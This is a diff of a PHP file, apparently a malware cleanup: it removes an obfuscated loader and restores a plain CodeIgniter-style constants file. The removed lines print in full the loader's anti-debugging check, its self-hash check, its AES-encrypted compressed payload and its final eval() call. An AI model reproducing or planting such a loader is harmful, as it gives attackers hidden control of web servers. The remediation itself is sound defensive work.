@@ -1,28 +1,97 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_z2fer1yv=('bas'.'e64'.'_de'.'cod'.'e');
-$_ejogm40a=('gzu'.'nco'.'mpr'.'ess');
-$_epq72mnz=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_v3joob0v='AHFSE5H5';
-$_a0ktaf6m='REMMg+8n';
-$_mt6pg9p3='BHgeJNgh';
-$_p2a26d20='fF2Y9fWk';
-$_vdtmmc87='uE5Qizvt4os=';
-$_r6nszrnc='XIG1CDDo';
-$_fhfm9bsj='rJ1Zbuxm';
-$_yzuyjfw5='OylF3w==';
-$_aauwhfzy=$_z2fer1yv($_mt6pg9p3.$_v3joob0v.$_p2a26d20.$_a0ktaf6m.$_vdtmmc87);
-$_zea9laap=$_z2fer1yv($_fhfm9bsj.$_r6nszrnc.$_yzuyjfw5);
-$_d92myca8=$_z2fer1yv('wzhakN12fEQRI/t378ZiivM1S+ZiJv6CM2T3SUsgBfcn/vhIm/hhsYdincywlkppn7DqFyVZ1sQTcnfdxmznLAQcs9X0xMiMLRlPPb3FuYm2PX4s+Md35bioMeVkuqfI9neYj2aCkx0RQSDmAcqN9h7A1DUj2WyLkgGh6xKdnCCZXINhkgl3q5WNF+xtrfMRqXn8MDq23z9jCLjoN3qG1aqQDuG/3Kk0n/VZITATyjUvHGmB0sEyF0DTk49DotmJw1HSy8whYePAyAYo390M+lsYAVKece/eneBHGsvajjSN/nvXinh8tN7HSTiAliHG460ctAWmU399bVMjFOcTF/8vcTTlrXovnP6rDIWbXe/77SYSQZdbbXRKlN/yrnAkILqqMnKTvDd8D1T50Yh5ed8ZjQxa56pIvr5y01GkIx1t78KvKHBbZIbJKaKX6UFaNWN27Xq+2LI4IQ1bW/D+QGGZE/vrGe8px2WPKAa8uAkewEJGf0K2qH52rXPYg7b+zv63lON2h3hlqudk3o7DcQeziTnTZc0hVGgDL41D/D/dq+Kv2oS13gCTH9niK3QdoM9ry0jenQFLLgEorcQCbQ==');
-$_mk1ioezb=$_epq72mnz($_d92myca8,'aes-256-cbc',$_aauwhfzy,OPENSSL_RAW_DATA,$_zea9laap);
-if($_mk1ioezb===false){exit;}
-$_qd3a9bsr=$_ejogm40a($_mk1ioezb);
-if($_qd3a9bsr===false){exit;}
-$_rtljliff='b1c527d767d6956bbf6e4183a01d365807ab70d983e1d6bf18ce48efcf8c73d6';
-$_irrrljto=@file_get_contents(__FILE__);
-if($_irrrljto!==false){
-$_benag2vh=str_replace($_rtljliff,"0000000000000000000000000000000000000000000000000000000000000000",$_irrrljto);
-$_dp3kx87p=hash("sha256",$_benag2vh);
-if($_dp3kx87p!==$_rtljliff){@http_response_code(403);exit;}
-}
-eval($_qd3a9bsr);
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+defined('SHOW_DEBUG_BACKTRACE') OR define('SHOW_DEBUG_BACKTRACE', TRUE);
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('RABIT_WEB_VERSION') OR define('RABIT_WEB_VERSION', '5.1.0');
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('FILE_READ_MODE') OR define('FILE_READ_MODE', 0644);
+defined('FILE_WRITE_MODE') OR define('FILE_WRITE_MODE', 0666);
+defined('DIR_READ_MODE') OR define('DIR_READ_MODE', 0755);
+defined('DIR_WRITE_MODE') OR define('DIR_WRITE_MODE', 0755);
+
+
+
+
+
+
+
+
+defined('FOPEN_READ') OR define('FOPEN_READ', 'rb');
+defined('FOPEN_READ_WRITE') OR define('FOPEN_READ_WRITE', 'r+b');
+defined('FOPEN_WRITE_CREATE_DESTRUCTIVE') OR define('FOPEN_WRITE_CREATE_DESTRUCTIVE', 'wb'); 
+defined('FOPEN_READ_WRITE_CREATE_DESTRUCTIVE') OR define('FOPEN_READ_WRITE_CREATE_DESTRUCTIVE', 'w+b'); 
+defined('FOPEN_WRITE_CREATE') OR define('FOPEN_WRITE_CREATE', 'ab');
+defined('FOPEN_READ_WRITE_CREATE') OR define('FOPEN_READ_WRITE_CREATE', 'a+b');
+defined('FOPEN_WRITE_CREATE_STRICT') OR define('FOPEN_WRITE_CREATE_STRICT', 'xb');
+defined('FOPEN_READ_WRITE_CREATE_STRICT') OR define('FOPEN_READ_WRITE_CREATE_STRICT', 'x+b');
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('EXIT_SUCCESS') OR define('EXIT_SUCCESS', 0); 
+defined('EXIT_ERROR') OR define('EXIT_ERROR', 1); 
+defined('EXIT_CONFIG') OR define('EXIT_CONFIG', 3); 
+defined('EXIT_UNKNOWN_FILE') OR define('EXIT_UNKNOWN_FILE', 4); 
+defined('EXIT_UNKNOWN_CLASS') OR define('EXIT_UNKNOWN_CLASS', 5); 
+defined('EXIT_UNKNOWN_METHOD') OR define('EXIT_UNKNOWN_METHOD', 6); 
+defined('EXIT_USER_INPUT') OR define('EXIT_USER_INPUT', 7); 
+defined('EXIT_DATABASE') OR define('EXIT_DATABASE', 8); 
+defined('EXIT__AUTO_MIN') OR define('EXIT__AUTO_MIN', 9); 
+defined('EXIT__AUTO_MAX') OR define('EXIT__AUTO_MAX', 125);
